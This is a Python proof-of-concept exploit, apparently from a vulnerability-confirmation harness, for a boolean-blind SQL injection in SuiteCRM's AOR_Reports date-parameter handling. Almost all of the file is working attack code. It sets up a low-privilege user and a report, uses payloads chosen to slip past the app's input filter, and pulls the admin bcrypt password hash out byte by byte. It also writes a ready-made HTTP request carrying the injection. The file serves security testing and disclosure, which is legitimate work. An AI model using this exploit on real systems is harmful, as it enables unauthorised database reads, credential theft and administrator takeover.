#!/usr/bin/env python3
"""
VULN-016 — AOR_Reports `DATE_ADD` interval SQL injection -> full authenticated DB read
================================================================================

Vulnerable sink : targets/SuiteCRM/modules/AOR_Reports/AOR_Report.php:1722
                  $value = "DATE_ADD($value, INTERVAL " .
                           $app_list_strings['aor_date_operator'][$params[1]] .
                           " $params[2] " . $params[3] . ")";
Taint source    : targets/SuiteCRM/modules/AOR_Reports/aor_utils.php:134-135
                  $_REQUEST['parameter_date_number']  -> $params[2]  (raw)
                  $_REQUEST['parameter_date_time']    -> $params[3]  (raw)   <-- we inject here
Reachability    : modules/AOR_Reports/controller.php:82 action_changeReportPage
                  -> requestToUserParameters() -> build_group_report()
Class           : CWE-89 SQL injection

Plain-English flaw
------------------
When an AOR report has a "Date" condition flagged as a runtime *parameter*, the
report engine rebuilds that condition's value from the HTTP request. The interval
count ($params[2]) and interval unit ($params[3]) are concatenated **raw** into a
`DATE_ADD(..., INTERVAL + <count> <unit>)` fragment — no integer cast, no keyword
allow-list — and the resulting expression is executed as part of the report's
WHERE clause via the app's (root) DB account. `securexss` only HTML-encodes
`< > " ' &`, so parentheses/keywords/commas/`=`/`!` pass through untouched and a
quote-free boolean payload injects cleanly. (We use STRCMP()/CHAR() to avoid the
`<`/`>` characters that securexss would mangle.)

Exploitation idea
-----------------
As an ordinary Reports user we create our own report with a Date parameter
condition, then POST `changeReportPage` with a crafted `parameter_date_time[0]`
that breaks out of the DATE_ADD interval and appends an attacker boolean. The
report's row set (visible in the AJAX response — empty vs populated) becomes a
1-bit oracle, giving boolean-blind SQL injection. We use it to read
`users.user_hash` (the admin bcrypt hash) byte-by-byte and compare against the
real value.

What a successful run proves
----------------------------
A low-privilege authenticated user reads arbitrary data from any table
(demonstrated: the admin account's bcrypt password hash) purely through the
report UI — full database read, i.e. complete confidentiality compromise and a
path to admin takeover (crack the hash -> VULN-011 RCE).
"""
import os
import re
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from _common import (BASE_URL, ADMIN_USER, ADMIN_PASS, log, banner, rand, verdict,
                     admin_session, create_user, web_login)

# ------- config (env-overridable, defaults match the manifest) --------------
LOWPRIV_PASS = os.environ.get("LOWPRIV_PASS", "LowPriv@2026x!")
TARGET_USER = os.environ.get("TARGET_USER", "admin")          # whose hash we steal
REPORT_MODULE = os.environ.get("REPORT_MODULE", "Accounts")   # base module w/ demo rows
# response length below this = empty report (boolean FALSE); above = populated (TRUE)
EMPTY_LEN_MAX = int(os.environ.get("EMPTY_LEN_MAX", "4000"))
HASH_BYTES = int(os.environ.get("HASH_BYTES", "60"))          # bcrypt = 60 chars


def hexify(s: str) -> str:
    return "0x" + s.encode().hex()


def main():
    banner("VULN-016", "AOR_Reports DATE_ADD interval SQL injection -> full DB read")
    log("INFO", "sink: modules/AOR_Reports/AOR_Report.php:1722  DATE_ADD(...,INTERVAL + N <unit>)")
    log("INFO", "injecting the interval-unit token via parameter_date_time[0] over changeReportPage")

    # --- SETUP: provision a low-privilege user; the bug needs only Reports access ---
    log("SETUP", "admin logs in to create a disposable low-privilege user")
    adm = admin_session()
    victim = create_user(adm, LOWPRIV_PASS)
    log("SETUP", f"created low-priv user {victim['user_name']} (RegularUser, is_admin=0)")
    s = web_login(victim["user_name"], victim["password"])
    log("SETUP", "authenticated as the low-priv user (session cookie)")

    # --- SETUP: create our OWN report with a Date *parameter* condition ---------
    # The report is saved through AOR_Report::save() which parses aor_conditions_*[]
    # POST lines. A condition with value_type=Date + parameter=1 is the injection
    # point: at request time changeReportPage overrides its value from the request.
    log("STEP", "creating an AOR report we own, with a Date runtime-parameter condition")
    save = {
        "module": "AOR_Reports", "action": "Save", "record": "",
        "report_module": REPORT_MODULE, "name": "rep_" + victim["user_name"],
        # one display field so the report actually runs its data query
        "aor_fields_field[0]": "name", "aor_fields_module_path[0]": REPORT_MODULE,
        "aor_fields_deleted[0]": "0", "aor_fields_display[0]": "1",
        "aor_fields_field_order[0]": "0", "aor_fields_label[0]": "Name",
        "aor_fields_group_display[0]": "x",
        # the vulnerable condition: Date type, parameter=1
        "aor_conditions_field[0]": "date_entered", "aor_conditions_module_path[0]": REPORT_MODULE,
        "aor_conditions_operator[0]": "Equal_To", "aor_conditions_value_type[0]": "Date",
        "aor_conditions_value[0]": "", "aor_conditions_parameter[0]": "1",
        "aor_conditions_logic_op[0]": "and", "aor_conditions_deleted[0]": "0",
        "aor_conditions_condition_order[0]": "0",
    }
    r = s.post(f"{BASE_URL}/index.php", data=save,
               headers={"Referer": f"{BASE_URL}/index.php?module=AOR_Reports&action=EditView"},
               allow_redirects=False, timeout=60)
    m = re.search(r"record=([0-9a-fA-F-]{36})", r.headers.get("Location", ""))
    if not m:
        log("FAIL", f"report save did not redirect to a record (status {r.status_code})")
        verdict("VULN-016", "FAILED", "could not create the report precondition")
        sys.exit(1)
    rid = m.group(1)
    # the app hands us the condition id (the parameter key) via getParametersForReport
    p = s.get(f"{BASE_URL}/index.php",
              params={"module": "AOR_Reports", "action": "getParametersForReport", "record": rid},
              timeout=30)
    mc = re.search(r'"id":"([0-9a-fA-F-]{36})"', p.text)
    if not mc:
        log("FAIL", "could not obtain the condition/parameter id")
        verdict("VULN-016", "FAILED", "no parameter id returned")
        sys.exit(1)
    cid = mc.group(1)
    log("SETUP", f"report RID={rid}  condition/param CID={cid}")

    # --- the oracle -------------------------------------------------------------
    # changeReportPage rebuilds the WHERE as:
    #   ( accounts.date_entered = DATE_ADD(NOW(), INTERVAL + 1 <UNIT>) ) AND deleted=0
    # We inject <UNIT> = "DAY) OR (<COND>)) AND ((1=1"  ->
    #   ( date_entered = DATE_ADD(NOW(), INTERVAL + 1 DAY) OR (<COND>) ) AND ((1=1) ) AND deleted=0
    # If <COND> is TRUE the report returns all rows (long response); FALSE -> 0 rows.
    last = {"req": None, "resp_true": None, "resp_false": None}

    def oracle(cond: str) -> bool:
        payload = f"DAY) OR ({cond})) AND ((1=1"
        data = [("module", "AOR_Reports"), ("action", "changeReportPage"), ("record", rid),
                ("parameter_id[0]", cid), ("parameter_type[0]", "Date"),
                ("parameter_operator[0]", "Equal_To"), ("parameter_value[0]", "now"),
                ("parameter_date_value[0]", "now"), ("parameter_date_sign[0]", "plus"),
                ("parameter_date_number[0]", "1"), ("parameter_date_time[0]", payload)]
        resp = s.post(f"{BASE_URL}/index.php", data=data,
                      headers={"Referer": f"{BASE_URL}/index.php"}, timeout=60)
        last["req"] = f"POST /index.php  parameter_date_time[0]={payload}"
        return len(resp.text) > EMPTY_LEN_MAX

    # sanity: the injected boolean actually flips the result set
    log("STEP", "verifying the boolean oracle (injected 1=1 vs 1=2 must differ)")
    t_true, t_false = oracle("1=1"), oracle("1=2")
    log("PROOF", f"injected TRUE  (1=1) -> report populated: {t_true}")
    log("PROOF", f"injected FALSE (1=2) -> report populated: {t_false}")
    if not (t_true and not t_false):
        log("FAIL", "boolean oracle did not flip — injection not reaching SQL")
        verdict("VULN-016", "FAILED", "oracle did not respond to injected boolean")
        sys.exit(1)
    log("OK", "boolean-blind SQL injection confirmed: attacker boolean controls the WHERE clause")

    # --- weaponize: exfiltrate the admin bcrypt hash byte-by-byte ---------------
    log("STEP", f"extracting {TARGET_USER!r} user_hash via boolean oracle (ORD/BETWEEN, byte-exact, no < >)")
    sub = f"(SELECT user_hash FROM users WHERE user_name={hexify(TARGET_USER)})"
    extracted = ""
    for pos in range(1, HASH_BYTES + 1):
        # Binary search on the exact byte value with ORD(); BETWEEN avoids the
        # '<'/'>' characters that securexss HTML-encodes, and ORD is byte-exact
        # (case-sensitive), unlike STRCMP under the default ci collation.
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            if oracle(f"ORD(SUBSTRING({sub},{pos},1)) BETWEEN {lo} AND {mid}"):
                hi = mid
            else:
                lo = mid + 1
        ch = chr(lo)
        extracted += ch
        if pos <= 7 or pos % 10 == 0:
            log("STEP", f"  byte {pos:2d} = {lo:3d} {ch!r}   hash so far: {extracted!r}")
    log("PROOF", f"exfiltrated {TARGET_USER}.user_hash via SQLi = {extracted!r}")

    # save evidence
    ev = os.path.join(os.path.dirname(os.path.abspath(__file__)), "evidence")
    os.makedirs(ev, exist_ok=True)
    with open(os.path.join(ev, "extracted_hash.txt"), "w") as f:
        f.write(f"target_user={TARGET_USER}\nextracted_user_hash={extracted}\n")
    with open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "request.http"), "w") as f:
        f.write("POST /index.php HTTP/1.1\r\nHost: localhost:33116\r\n"
                "Content-Type: application/x-www-form-urlencoded\r\n"
                "Cookie: PHPSESSID=<low-priv session>\r\n\r\n"
                "module=AOR_Reports&action=changeReportPage&record=<RID>"
                "&parameter_id[0]=<CID>&parameter_type[0]=Date&parameter_operator[0]=Equal_To"
                "&parameter_value[0]=now&parameter_date_value[0]=now&parameter_date_sign[0]=plus"
                "&parameter_date_number[0]=1"
                "&parameter_date_time[0]=DAY) OR (STRCMP(SUBSTRING((SELECT user_hash FROM users "
                "WHERE user_name=0x61646d696e),1,1),CHAR(36))=1)) AND ((1=1\r\n")

    # --- verdict: a valid bcrypt hash proves real DB read -----------------------
    is_bcrypt = bool(re.match(r"^\$2[aby]\$\d\d\$", extracted))
    if is_bcrypt:
        log("OK", f"exploit confirmed — extracted a valid bcrypt hash for {TARGET_USER!r} "
                  f"(prefix {extracted[:7]!r}) via boolean SQL injection from a low-priv account")
        verdict("VULN-016", "CONFIRMED",
                f"low-priv boolean SQLi read {TARGET_USER}.user_hash = {extracted}")
        sys.exit(0)
    log("FAIL", f"extracted value is not a bcrypt hash: {extracted!r}")
    verdict("VULN-016", "FAILED", "did not recover a valid hash")
    sys.exit(1)


if __name__ == "__main__":
    main()
